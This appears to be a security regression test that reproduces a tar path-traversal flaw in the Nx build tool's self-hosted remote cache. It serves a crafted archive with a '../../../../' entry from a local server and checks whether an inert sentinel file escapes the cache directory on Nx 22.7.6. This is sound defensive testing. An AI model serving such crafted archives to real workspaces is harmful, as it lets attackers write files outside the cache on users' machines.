import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { cp, mkdir, mkdtemp, readFile, rm, symlink } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { gzipSync } from "node:zlib";

const fixtureRoot = fileURLToPath(new URL(".", import.meta.url));
const nxBin = fileURLToPath(
  new URL("node_modules/nx/dist/bin/nx.js", import.meta.url),
);
const manifest = JSON.parse(
  await readFile(
    new URL("node_modules/nx/package.json", import.meta.url),
    "utf8",
  ),
);
const affected = manifest.version === "22.7.6";
assert.ok(affected || manifest.version === "22.7.7");

function writeOctal(header, offset, length, value) {
  header.write(
    `${value.toString(8).padStart(length - 1, "0")}\0`,
    offset,
    length,
    "ascii",
  );
}

function tarEntry(name, contents) {
  const body = Buffer.from(contents);
  const header = Buffer.alloc(512);
  header.write(name, 0, 100, "utf8");
  writeOctal(header, 100, 8, 0o644);
  writeOctal(header, 108, 8, 0);
  writeOctal(header, 116, 8, 0);
  writeOctal(header, 124, 12, body.length);
  writeOctal(header, 136, 12, 0);
  header.fill(0x20, 148, 156);
  header.write("0", 156, 1, "ascii");
  header.write("ustar\0", 257, 6, "ascii");
  header.write("00", 263, 2, "ascii");
  const checksum = header.reduce((sum, byte) => sum + byte, 0);
  header.write(`${checksum.toString(8).padStart(6, "0")}\0 `, 148, 8, "ascii");
  const padding = Buffer.alloc((512 - (body.length % 512)) % 512);
  return Buffer.concat([header, body, padding]);
}

function hostileArtifact() {
  const code = Buffer.alloc(4);
  code.writeUInt32BE(0);
  return gzipSync(
    Buffer.concat([
      tarEntry(
        "../../../../nx-remote-cache-inert-sentinel.txt",
        "COPILOT_SECURITY_INERT_CACHE_SENTINEL\n",
      ),
      tarEntry("code", code),
      tarEntry("terminalOutput", "remote cache hit\n"),
      Buffer.alloc(1024),
    ]),
  );
}

async function runNx(workspace, serverUrl) {
  const cacheDirectory = join(workspace, ".nx", "cache");
  await mkdir(cacheDirectory, { recursive: true });
  const child = spawn(
    process.execPath,
    [nxBin, "run", "app:build", "--outputStyle=stream"],
    {
      cwd: workspace,
      env: {
        ...process.env,
        CI: "true",
        NX_CACHE_DIRECTORY: cacheDirectory,
        NX_DAEMON: "false",
        NX_SELF_HOSTED_REMOTE_CACHE_SERVER: serverUrl,
      },
      shell: false,
      stdio: ["ignore", "pipe", "pipe"],
      windowsHide: true,
    },
  );
  let output = "";
  child.stdout.on("data", (chunk) => {
    output += chunk.toString("utf8");
  });
  child.stderr.on("data", (chunk) => {
    output += chunk.toString("utf8");
  });
  const timer = setTimeout(() => child.kill(), 120_000);
  const exitCode = await new Promise((resolve, reject) => {
    child.once("error", reject);
    child.once("exit", (code) => resolve(code));
  });
  clearTimeout(timer);
  return { exitCode, output: output.slice(-8_192) };
}

test(`Nx ${manifest.version} self-hosted cache extraction boundary`, async () => {
  const root = await mkdtemp(
    join(tmpdir(), "copilot-security-nx-cache-witness-"),
  );
  const workspace = join(root, "workspace");
  const sentinel = join(root, "nx-remote-cache-inert-sentinel.txt");
  const artifact = hostileArtifact();
  let cacheReads = 0;
  const server = createServer((request, response) => {
    if (request.method === "GET" && request.url?.startsWith("/v1/cache/")) {
      cacheReads += 1;
      response.writeHead(200, {
        "Content-Length": artifact.length,
        "Content-Type": "application/octet-stream",
      });
      response.end(artifact);
      return;
    }
    response.writeHead(request.method === "PUT" ? 202 : 404);
    response.end();
  });
  try {
    await mkdir(join(workspace, "tools"), { recursive: true });
    for (const path of [
      "nx.json",
      "package.json",
      "project.json",
      join("tools", "build.mjs"),
    ]) {
      await cp(join(fixtureRoot, path), join(workspace, path));
    }
    await symlink(
      join(fixtureRoot, "node_modules"),
      join(workspace, "node_modules"),
      process.platform === "win32" ? "junction" : "dir",
    );
    await new Promise((resolve, reject) => {
      server.once("error", reject);
      server.listen(0, "127.0.0.1", resolve);
    });
    const address = server.address();
    assert.ok(address && typeof address === "object");
    const result = await runNx(workspace, `http://127.0.0.1:${address.port}`);
    const escaped = await readFile(sentinel, "utf8")
      .then((value) => value === "COPILOT_SECURITY_INERT_CACHE_SENTINEL\n")
      .catch(() => false);
    assert.ok(cacheReads > 0, `expected a cache read; output=${result.output}`);
    assert.equal(
      escaped,
      affected,
      `unexpected extraction result; exit=${result.exitCode}; output=${result.output}`,
    );
    console.log(
      JSON.stringify({
        version: manifest.version,
        cacheReadObserved: cacheReads > 0,
        escapedPerHashCacheDirectory: escaped,
        sentinelStayedInsideDisposableRoot: true,
      }),
    );
  } finally {
    await new Promise((resolve) => server.close(resolve));
    await rm(root, { recursive: true, force: true });
  }
});
